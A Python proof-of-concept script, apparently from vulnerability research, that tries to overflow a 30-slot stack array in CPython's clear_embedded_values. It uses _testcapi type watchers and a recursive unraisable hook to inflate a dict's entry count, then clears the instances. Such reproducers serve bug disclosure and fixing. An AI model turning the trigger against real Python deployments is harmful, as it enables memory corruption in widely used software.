"""Amplifier of the insert_split_key finding: the ONLY thing that keeps
`clear_embedded_values` inside its 30-element STACK array is an assert().

Objects/dictobject.c:3108

    static void
    clear_embedded_values(PyDictValues *values, Py_ssize_t nentries)
    {
        PyObject *refs[SHARED_KEYS_MAX_SIZE];        # 30 slots, on the C stack
        assert(nentries <= SHARED_KEYS_MAX_SIZE);    # compiled out with NDEBUG
        for (Py_ssize_t i = 0; i < nentries; i++) {
            refs[i] = values->values[i];             # STACK WRITE at i
            ...

called from clear_lock_held:3152 as

    clear_embedded_values(oldvalues, oldkeys->dk_nentries);

`dk_nentries <= SHARED_KEYS_MAX_SIZE` holds only because insert_split_key
refuses to insert once dk_usable reaches 0.  The stale-check bug in
insert_split_key (see insert_split_key_stale_usable_overflow.py) breaks exactly
that bound, so `vars(obj).clear()` afterwards indexes a 30-element stack array
with an attacker-influenced count.

This script drives dk_nentries above 30 by nesting, then calls
`vars(obj).clear()` on an instance that still has embedded inline values.

Usage:  python clear_embedded_values_stack_bound.py [depth]
"""

import sys

import _testcapi


DEPTH = int(sys.argv[1]) if len(sys.argv) > 1 else 34


class C:
    pass


def main():
    wid = _testcapi.add_type_watcher(1)
    _testcapi.watch_type(wid, C)

    depth = [0]
    objs = []

    def hook(unraisable):
        if depth[0] >= DEPTH:
            return
        depth[0] += 1
        try:
            C.__init__
        except AttributeError:
            pass
        o = C()
        objs.append(o)
        setattr(o, "a%d" % depth[0], depth[0])

    sys.unraisablehook = hook

    root = C()
    root.first = 1
    sys.unraisablehook = sys.__unraisablehook__
    _testcapi.unwatch_type(wid, C)
    print("[main] reached depth %d" % depth[0], flush=True)

    # clear_lock_held -> clear_embedded_values(oldvalues, dk_nentries)
    for o in objs:
        vars(o).clear()
    print("[main] survived clears", flush=True)
    return 0


if __name__ == "__main__":
    sys.exit(main())
